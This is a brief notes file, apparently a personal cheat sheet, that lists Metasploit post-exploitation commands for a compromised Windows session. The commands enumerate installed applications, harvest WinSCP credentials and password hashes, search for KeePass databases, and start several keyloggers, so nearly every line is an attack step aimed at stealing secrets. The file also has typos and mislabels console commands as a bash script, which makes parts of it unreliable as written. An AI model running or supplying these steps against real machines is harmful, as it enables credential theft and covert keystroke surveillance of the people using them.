#!/bin/bash
#first make session and do
use ost/windows/gather/enum_applications # all info will stored dirctry in file
set session1 
run
# this way give som info for enumeration abount app

use post/windows/gather/credentials/winscp
set session 1
run
# this wiik=l looking for winSCP.ini file 
# 
use post/windows/gather/credentials/credential_collector 
set session 1
run 
# if this work will give key password hash

 
# for looking about keypass
search -f *.kdb -r -d .
# keyloggr
keyscan_start
keyscan_dump
keyscan_stop
run post/windows/capture/keylog_recorder # Directory 
run post/windows/capture/lockout_keylogger


